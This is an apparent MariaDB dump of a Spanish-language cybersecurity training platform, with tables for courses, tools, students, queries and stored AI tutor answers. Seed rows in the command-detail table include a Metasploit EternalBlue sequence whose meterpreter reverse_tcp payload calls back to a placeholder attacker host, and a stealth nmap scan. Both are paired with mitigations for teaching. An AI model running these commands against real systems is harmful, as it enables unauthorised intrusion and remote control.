/*M!999999\- enable the sandbox mode */ 
-- MariaDB dump 10.19-12.2.2-MariaDB, for Linux (x86_64)
--
-- Host: localhost    Database: cyber_portfolio_db
-- ------------------------------------------------------
-- Server version	12.2.2-MariaDB

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*M!100616 SET @OLD_NOTE_VERBOSITY=@@NOTE_VERBOSITY, NOTE_VERBOSITY=0 */;

--
-- Table structure for table `auditoria`
--

DROP TABLE IF EXISTS `auditoria`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `auditoria` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `usuario_id` bigint(20) DEFAULT NULL,
  `accion` varchar(100) NOT NULL,
  `tabla_afectada` varchar(100) DEFAULT NULL,
  `registro_id` bigint(20) DEFAULT NULL,
  `descripcion` text DEFAULT NULL,
  `fecha_hora` datetime DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `idx_usuario_id` (`usuario_id`),
  KEY `idx_fecha_hora` (`fecha_hora`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auditoria`
--

SET @OLD_AUTOCOMMIT=@@AUTOCOMMIT, @@AUTOCOMMIT=0;
LOCK TABLES `auditoria` WRITE;
/*!40000 ALTER TABLE `auditoria` DISABLE KEYS */;
/*!40000 ALTER TABLE `auditoria` ENABLE KEYS */;
UNLOCK TABLES;
COMMIT;
SET AUTOCOMMIT=@OLD_AUTOCOMMIT;

--
-- Table structure for table `consulta`
--

DROP TABLE IF EXISTS `consulta`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `consulta` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `estudiante_id` bigint(20) NOT NULL,
  `pilar_id` bigint(20) NOT NULL,
  `tema_principal` varchar(255) NOT NULL,
  `estado` enum('PENDIENTE','ATENDIDA','CANCELADA') NOT NULL DEFAULT 'PENDIENTE',
  `cantidad_tokens_usados` int(11) DEFAULT 0,
  `fecha_creacion` datetime DEFAULT current_timestamp(),
  `ultima_actividad` datetime DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `fecha_cierre` datetime DEFAULT NULL,
  `motivo_cancelacion` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_estudiante_id` (`estudiante_id`),
  KEY `idx_pilar_id` (`pilar_id`),
  KEY `idx_estado` (`estado`),
  KEY `idx_fecha_creacion` (`fecha_creacion`),
  KEY `idx_ultima_actividad` (`ultima_actividad`),
  KEY `idx_consulta_estado_fecha` (`estado`,`fecha_creacion`),
  CONSTRAINT `fk_consulta_estudiante` FOREIGN KEY (`estudiante_id`) REFERENCES `usuario` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `fk_consulta_pilar` FOREIGN KEY (`pilar_id`) REFERENCES `pilar_ciberseguridad` (`id`) ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `consulta`
--

SET @OLD_AUTOCOMMIT=@@AUTOCOMMIT, @@AUTOCOMMIT=0;
LOCK TABLES `consulta` WRITE;
/*!40000 ALTER TABLE `consulta` DISABLE KEYS */;
INSERT INTO `consulta` VALUES
(1,5,1,'¿Cómo hacer un escaneo de puertos sin ser detectado?','PENDIENTE',150,'2026-05-26 17:22:03','2026-05-26 17:22:03',NULL,NULL),
(2,6,1,'¿Qué herramientas puedo usar para OSINT?','ATENDIDA',200,'2026-05-24 20:22:03','2026-05-25 20:22:03',NULL,NULL),
(3,7,2,'Pasos para explotar MS17-010','PENDIENTE',250,'2026-05-26 16:22:03','2026-05-26 16:22:03',NULL,NULL),
(4,5,3,'¿Cómo analizar un pcap en Wireshark?','ATENDIDA',180,'2026-05-21 20:22:03','2026-05-21 20:22:03',NULL,NULL);
/*!40000 ALTER TABLE `consulta` ENABLE KEYS */;
UNLOCK TABLES;
COMMIT;
SET AUTOCOMMIT=@OLD_AUTOCOMMIT;

--
-- Table structure for table `detalle_comando_pilar`
--

DROP TABLE IF EXISTS `detalle_comando_pilar`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `detalle_comando_pilar` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `pilar_id` bigint(20) NOT NULL,
  `herramienta_id` bigint(20) NOT NULL,
  `tipo_comando` varchar(100) DEFAULT NULL,
  `sintaxis` longtext NOT NULL,
  `captura_pantalla_url` varchar(500) DEFAULT NULL,
  `nivel_impacto` varchar(50) DEFAULT NULL,
  `vulnerabilidad_asociada` varchar(255) DEFAULT NULL,
  `mitigacion` longtext DEFAULT NULL,
  `descripcion_personalizada` text DEFAULT NULL,
  `subtema_id` bigint(20) DEFAULT NULL,
  `activo` tinyint(1) DEFAULT 1,
  `created_at` datetime DEFAULT current_timestamp(),
  `updated_at` datetime DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_pilar_herramienta_comando` (`pilar_id`,`herramienta_id`,`tipo_comando`),
  KEY `idx_pilar_id` (`pilar_id`),
  KEY `idx_herramienta_id` (`herramienta_id`),
  KEY `idx_subtema_id` (`subtema_id`),
  CONSTRAINT `fk_detalle_herramienta` FOREIGN KEY (`herramienta_id`) REFERENCES `herramienta` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `fk_detalle_pilar` FOREIGN KEY (`pilar_id`) REFERENCES `pilar_ciberseguridad` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `fk_detalle_subtema` FOREIGN KEY (`subtema_id`) REFERENCES `subtema` (`id`) ON DELETE SET NULL ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `detalle_comando_pilar`
--

SET @OLD_AUTOCOMMIT=@@AUTOCOMMIT, @@AUTOCOMMIT=0;
LOCK TABLES `detalle_comando_pilar` WRITE;
/*!40000 ALTER TABLE `detalle_comando_pilar` DISABLE KEYS */;
INSERT INTO `detalle_comando_pilar` VALUES
(1,1,1,'Escaneo SYN','nmap -sS -p 1-65535 -O -A -Pn target.com\n\nFlags:\n-sS: TCP SYN scan (stealth)\n-p: Rango de puertos\n-O: OS detection\n-A: Aggressive scan\n-Pn: Skip ping','https://api.example.com/screenshots/nmap-syn.png','MEDIO','Exposición de puertos abiertos','Implementar firewall, cerrar puertos innecesarios, ocultar versión de servicios','Escaneo de puertos para descubrimiento de servicios activos',1,1,'2026-05-26 20:22:03','2026-05-26 20:22:03'),
(2,2,2,'MS17-010 Exploit','use exploit/windows/smb/ms17_010_eternalblue\nset RHOST target.ip\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST attacker.ip\nset LPORT 4444\nexploit','https://api.example.com/screenshots/metasploit-eternal.png','CRÍTICO','MS17-010 (EternalBlue)','Parchear sistemas Windows, implementar segmentación de red, monitoreo EDR','Explotación de vulnerabilidad crítica en SMB para ejecución remota de código',2,1,'2026-05-26 20:22:03','2026-05-26 20:22:03'),
(3,3,4,'Captura de tráfico con filtros','wireshark -i eth0 -f \"tcp port 80 or tcp port 443\" -w capture.pcap\n\nFiltros avanzados:\nip.src == 192.168.1.1\nhttp.request.method == POST\nssl.handshake.type == 1','https://api.example.com/screenshots/wireshark-capture.png','BAJO','Exposición de credenciales en tráfico no cifrado','Usar HTTPS, implementar cifrado end-to-end, auditar acceso a capturas','Captura y análisis de tráfico de red para investigación forense',4,1,'2026-05-26 20:22:03','2026-05-26 20:22:03');
/*!40000 ALTER TABLE `detalle_comando_pilar` ENABLE KEYS */;
UNLOCK TABLES;
COMMIT;
SET AUTOCOMMIT=@OLD_AUTOCOMMIT;

--
-- Table structure for table `entorno`
--

DROP TABLE IF EXISTS `entorno`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `entorno` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `nombre` varchar(100) NOT NULL,
  `descripcion` varchar(255) DEFAULT NULL,
  `created_at` datetime DEFAULT current_timestamp(),
  `updated_at` datetime DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  PRIMARY KEY (`id`),
  UNIQUE KEY `nombre` (`nombre`),
  KEY `idx_nombre` (`nombre`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `entorno`
--

SET @OLD_AUTOCOMMIT=@@AUTOCOMMIT, @@AUTOCOMMIT=0;
LOCK TABLES `entorno` WRITE;
/*!40000 ALTER TABLE `entorno` DISABLE KEYS */;
INSERT INTO `entorno` VALUES
(1,'Linux','Entorno Linux para penetración testing','2026-05-26 20:22:03','2026-05-26 20:22:03'),
(2,'Windows','Entorno Windows para análisis de malware','2026-05-26 20:22:03','2026-05-26 20:22:03'),
(3,'Cloud','Entorno Cloud (AWS, Azure, GCP)','2026-05-26 20:22:03','2026-05-26 20:22:03');
/*!40000 ALTER TABLE `entorno` ENABLE KEYS */;
UNLOCK TABLES;
COMMIT;
SET AUTOCOMMIT=@OLD_AUTOCOMMIT;

--
-- Table structure for table `herramienta`
--

DROP TABLE IF EXISTS `herramienta`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `herramienta` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `nombre` varchar(100) NOT NULL,
  `descripcion` text DEFAULT NULL,
  `creador` varchar(100) DEFAULT NULL,
  `nivel_dificultad` varchar(50) DEFAULT NULL,
  `url_documentacion` varchar(500) DEFAULT NULL,
  `created_at` datetime DEFAULT current_timestamp(),
  `updated_at` datetime DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `idx_nombre` (`nombre`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `herramienta`
--

SET @OLD_AUTOCOMMIT=@@AUTOCOMMIT, @@AUTOCOMMIT=0;
LOCK TABLES `herramienta` WRITE;
/*!40000 ALTER TABLE `herramienta` DISABLE KEYS */;
INSERT INTO `herramienta` VALUES
(1,'Nmap','Escáner de puertos y descubrimiento de red','Gordon Lyon','Intermedio',NULL,'2026-05-26 20:22:03','2026-05-26 20:22:03'),
(2,'Metasploit','Framework de testing de penetración','Rapid7','Avanzado',NULL,'2026-05-26 20:22:03','2026-05-26 20:22:03'),
(3,'Burp Suite','Herramienta de análisis de seguridad web','PortSwigger','Intermedio',NULL,'2026-05-26 20:22:03','2026-05-26 20:22:03'),
(4,'Wireshark','Analizador de tráfico de red','Wireshark Team','Intermedio',NULL,'2026-05-26 20:22:03','2026-05-26 20:22:03'),
(5,'John the Ripper','Herramienta de cracking de contraseñas','Openwall Project','Avanzado',NULL,'2026-05-26 20:22:03','2026-05-26 20:22:03');
/*!40000 ALTER TABLE `herramienta` ENABLE KEYS */;
UNLOCK TABLES;
COMMIT;
SET AUTOCOMMIT=@OLD_AUTOCOMMIT;

--
-- Table structure for table `nivel_riesgo`
--

DROP TABLE IF EXISTS `nivel_riesgo`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `nivel_riesgo` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `codigo` varchar(50) NOT NULL,
  `descripcion` varchar(255) NOT NULL,
  `nivel_numerico` int(11) DEFAULT NULL,
  `created_at` datetime DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  UNIQUE KEY `codigo` (`codigo`),
  KEY `idx_codigo` (`codigo`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `nivel_riesgo`
--

SET @OLD_AUTOCOMMIT=@@AUTOCOMMIT, @@AUTOCOMMIT=0;
LOCK TABLES `nivel_riesgo` WRITE;
/*!40000 ALTER TABLE `nivel_riesgo` DISABLE KEYS */;
INSERT INTO `nivel_riesgo` VALUES
(1,'BAJO','Riesgo bajo sin impacto crítico',1,'2026-05-26 20:22:03'),
(2,'MEDIO','Riesgo medio con impacto moderado',2,'2026-05-26 20:22:03'),
(3,'ALTO','Riesgo alto con impacto significativo',3,'2026-05-26 20:22:03'),
(4,'CRÍTICO','Riesgo crítico con impacto catastrófico',4,'2026-05-26 20:22:03');
/*!40000 ALTER TABLE `nivel_riesgo` ENABLE KEYS */;
UNLOCK TABLES;
COMMIT;
SET AUTOCOMMIT=@OLD_AUTOCOMMIT;

--
-- Table structure for table `pilar_ciberseguridad`
--

DROP TABLE IF EXISTS `pilar_ciberseguridad`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `pilar_ciberseguridad` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `nombre_pilar` varchar(150) NOT NULL,
  `nombre_instructor` varchar(150) NOT NULL,
  `correo_contacto` varchar(100) NOT NULL,
  `icono_url` varchar(500) DEFAULT NULL,
  `temario` longtext DEFAULT NULL,
  `enlaces_referencia` longtext DEFAULT NULL COMMENT 'JSON array de enlaces',
  `url_repositorio` varchar(500) DEFAULT NULL,
  `horario_tutoria_inicio` time DEFAULT NULL,
  `horario_tutoria_fin` time DEFAULT NULL,
  `entorno_id` bigint(20) DEFAULT NULL,
  `activo` tinyint(1) DEFAULT 1,
  `created_at` datetime DEFAULT current_timestamp(),
  `updated_at` datetime DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `idx_nombre_instructor` (`nombre_instructor`),
  KEY `idx_entorno_id` (`entorno_id`),
  CONSTRAINT `fk_pilar_entorno` FOREIGN KEY (`entorno_id`) REFERENCES `entorno` (`id`) ON DELETE SET NULL ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `pilar_ciberseguridad`
--

SET @OLD_AUTOCOMMIT=@@AUTOCOMMIT, @@AUTOCOMMIT=0;
LOCK TABLES `pilar_ciberseguridad` WRITE;
/*!40000 ALTER TABLE `pilar_ciberseguridad` DISABLE KEYS */;
INSERT INTO `pilar_ciberseguridad` VALUES
(1,'Reconocimiento y OSINT','Dr. Juan Rodríguez','juan.rodriguez@cyber.edu','https://api.example.com/icons/osint.png','Módulo 1: Técnicas de OSINT\nMódulo 2: Enumeración de activos\nMódulo 3: Información de DNS y WHOIS','[{\"titulo\": \"OWASP Testing Guide\", \"url\": \"https://owasp.org\"}, {\"titulo\": \"Shodan API Docs\", \"url\": \"https://shodan.io\"}]','https://github.com/cybersec/osint-tools','08:00:00','17:00:00',1,1,'2026-05-26 20:22:03','2026-05-26 20:22:03'),
(2,'Explotación y Post-Explotación','Ing. María López','maria.lopez@cyber.edu','https://api.example.com/icons/exploit.png','Módulo 1: Tipos de exploits\nMódulo 2: Metasploit Framework\nMódulo 3: Post-explotación y persistencia','[{\"titulo\": \"Exploit Database\", \"url\": \"https://www.exploit-db.com\"}, {\"titulo\": \"CVE Details\", \"url\": \"https://www.cvedetails.com\"}]','https://github.com/cybersec/exploit-training','09:00:00','18:00:00',1,1,'2026-05-26 20:22:03','2026-05-26 20:22:03'),
(3,'Análisis Forense Digital','Lic. Carlos Mendez','carlos.mendez@cyber.edu','https://api.example.com/icons/forensics.png','Módulo 1: Fundamentos de Forense\nMódulo 2: Análisis de malware\nMódulo 3: Preservación de evidencia','[{\"titulo\": \"NIST Guidelines\", \"url\": \"https://csrc.nist.gov\"}, {\"titulo\": \"Sleuth Kit\", \"url\": \"https://www.sleuthkit.org\"}]','https://github.com/cybersec/forensics-lab','07:00:00','16:00:00',3,1,'2026-05-26 20:22:03','2026-05-26 20:22:03');
/*!40000 ALTER TABLE `pilar_ciberseguridad` ENABLE KEYS */;
UNLOCK TABLES;
COMMIT;
SET AUTOCOMMIT=@OLD_AUTOCOMMIT;

--
-- Table structure for table `pregunta_ia`
--

DROP TABLE IF EXISTS `pregunta_ia`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `pregunta_ia` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `consulta_id` bigint(20) NOT NULL,
  `pregunta_estudiante` longtext NOT NULL,
  `respuesta_ia` longtext NOT NULL,
  `tokens_consumidos` int(11) DEFAULT 0,
  `calificacion` enum('EXCELENTE','BUENA','MALA') DEFAULT NULL COMMENT 'Calificación de la respuesta',
  `fecha_hora` datetime DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `idx_consulta_id` (`consulta_id`),
  KEY `idx_fecha_hora` (`fecha_hora`),
  KEY `idx_calificacion` (`calificacion`),
  KEY `idx_pregunta_consulta_fecha` (`consulta_id`,`fecha_hora`),
  CONSTRAINT `fk_pregunta_consulta` FOREIGN KEY (`consulta_id`) REFERENCES `consulta` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `pregunta_ia`
--

SET @OLD_AUTOCOMMIT=@@AUTOCOMMIT, @@AUTOCOMMIT=0;
LOCK TABLES `pregunta_ia` WRITE;
/*!40000 ALTER TABLE `pregunta_ia` DISABLE KEYS */;
INSERT INTO `pregunta_ia` VALUES
(1,2,'¿Cuál es la herramienta más efectiva para recopilar información de una empresa?','La herramienta más efectiva depende del objetivo. Para OSINT general, Shodan es excelente para encontrar dispositivos conectados. Google Dorking permite búsquedas avanzadas. WHOIS y DNS recon proporcionan información de registro. TheHarvester automatiza búsquedas de correos y dominios.',100,'EXCELENTE','2026-05-25 20:22:03'),
(2,2,'¿Cuáles son los riesgos de usar estas herramientas?','Los riesgos incluyen: 1) Detección por IDS/IPS, 2) Rastreo de origen de consultas, 3) Violación de leyes de privacidad, 4) Generar alertas de seguridad. Siempre obtener autorización escrita antes de hacer reconocimiento.',100,'BUENA','2026-05-25 20:22:03'),
(3,3,'¿Qué versión de Metasploit debo usar para este laboratorio?','Se recomienda Metasploit Framework 6.2+ o superior. Asegúrate de que el sistema vulnerable sea una máquina virtual aislada. El servicio SMB debe estar expuesto en el puerto 445. Usa msfconsole en línea de comandos para máximo control.',125,'EXCELENTE','2026-05-26 17:22:03'),
(4,4,'¿Cómo filtro solo el tráfico HTTPS en Wireshark?','Usa el filtro: ssl.handshake.type == 1 para capturar handshakes. O directamente: tcp.port == 443. Para ver contenido descifrado, necesitas las claves privadas del servidor o usar SSLKEYLOGFILE.',140,'BUENA','2026-05-21 20:22:03'),
(5,4,'¿Qué información sensible puedo encontrar en una captura descifrada?','En HTTPS descifrado podrías encontrar: cookies de sesión, tokens, credenciales, datos personales, patrones de comunicación. Por eso es crítico proteger tráfico con HTTPS y verificar certificados válidos.',40,'EXCELENTE','2026-05-21 20:22:03');
/*!40000 ALTER TABLE `pregunta_ia` ENABLE KEYS */;
UNLOCK TABLES;
COMMIT;
SET AUTOCOMMIT=@OLD_AUTOCOMMIT;

--
-- Table structure for table `subtema`
--

DROP TABLE IF EXISTS `subtema`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `subtema` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `codigo` varchar(50) NOT NULL,
  `descripcion` varchar(255) NOT NULL,
  `created_at` datetime DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  UNIQUE KEY `codigo` (`codigo`),
  KEY `idx_codigo` (`codigo`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `subtema`
--

SET @OLD_AUTOCOMMIT=@@AUTOCOMMIT, @@AUTOCOMMIT=0;
LOCK TABLES `subtema` WRITE;
/*!40000 ALTER TABLE `subtema` DISABLE KEYS */;
INSERT INTO `subtema` VALUES
(1,'OSINT','Open Source Intelligence','2026-05-26 20:22:03'),
(2,'PRIV_ESC','Privilege Escalation','2026-05-26 20:22:03'),
(3,'WEB_EXPLOIT','Explotación de Vulnerabilidades Web','2026-05-26 20:22:03'),
(4,'FORENSICS','Análisis Forense Digital','2026-05-26 20:22:03');
/*!40000 ALTER TABLE `subtema` ENABLE KEYS */;
UNLOCK TABLES;
COMMIT;
SET AUTOCOMMIT=@OLD_AUTOCOMMIT;

--
-- Table structure for table `usuario`
--

DROP TABLE IF EXISTS `usuario`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `usuario` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `email` varchar(100) NOT NULL,
  `nombre_completo` varchar(150) DEFAULT NULL,
  `contrasena` varchar(255) DEFAULT NULL,
  `rol` varchar(50) NOT NULL DEFAULT 'ESTUDIANTE' COMMENT 'ADMINISTRADOR, INSTRUCTOR, ESTUDIANTE',
  `pilar_asignado_id` bigint(20) DEFAULT NULL COMMENT 'Aplica solo para INSTRUCTOR',
  `activo` tinyint(1) DEFAULT 1,
  `ultimo_acceso` datetime DEFAULT NULL,
  `created_at` datetime DEFAULT current_timestamp(),
  `updated_at` datetime DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  PRIMARY KEY (`id`),
  UNIQUE KEY `email` (`email`),
  KEY `idx_email` (`email`),
  KEY `idx_rol` (`rol`),
  KEY `idx_pilar_asignado_id` (`pilar_asignado_id`),
  KEY `idx_usuario_rol` (`rol`,`activo`),
  CONSTRAINT `fk_usuario_pilar` FOREIGN KEY (`pilar_asignado_id`) REFERENCES `pilar_ciberseguridad` (`id`) ON DELETE SET NULL ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `usuario`
--

SET @OLD_AUTOCOMMIT=@@AUTOCOMMIT, @@AUTOCOMMIT=0;
LOCK TABLES `usuario` WRITE;
/*!40000 ALTER TABLE `usuario` DISABLE KEYS */;
INSERT INTO `usuario` VALUES
(1,'admin@cyber.edu','Administrador Sistema','$2a$10$adminHashPassword','ADMINISTRADOR',NULL,1,NULL,'2026-05-26 20:22:03','2026-05-26 20:22:03'),
(2,'juan.rodriguez@cyber.edu','Dr. Juan Rodríguez','$2a$10$instructorHash1','INSTRUCTOR',1,1,NULL,'2026-05-26 20:22:03','2026-05-26 20:22:03'),
(3,'maria.lopez@cyber.edu','Ing. María López','$2a$10$instructorHash2','INSTRUCTOR',2,1,NULL,'2026-05-26 20:22:03','2026-05-26 20:22:03'),
(4,'carlos.mendez@cyber.edu','Lic. Carlos Mendez','$2a$10$instructorHash3','INSTRUCTOR',3,1,NULL,'2026-05-26 20:22:03','2026-05-26 20:22:03'),
(5,'estudiante1@cyber.edu','Pedro García','$2a$10$studentHash1','ESTUDIANTE',NULL,1,NULL,'2026-05-26 20:22:03','2026-05-26 20:22:03'),
(6,'estudiante2@cyber.edu','Ana Martinez','$2a$10$studentHash2','ESTUDIANTE',NULL,1,NULL,'2026-05-26 20:22:03','2026-05-26 20:22:03'),
(7,'estudiante3@cyber.edu','Luis Fernández','$2a$10$studentHash3','ESTUDIANTE',NULL,1,NULL,'2026-05-26 20:22:03','2026-05-26 20:22:03');
/*!40000 ALTER TABLE `usuario` ENABLE KEYS */;
UNLOCK TABLES;
COMMIT;
SET AUTOCOMMIT=@OLD_AUTOCOMMIT;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*M!100616 SET NOTE_VERBOSITY=@OLD_NOTE_VERBOSITY */;

-- Dump completed on 2026-06-02 16:21:55
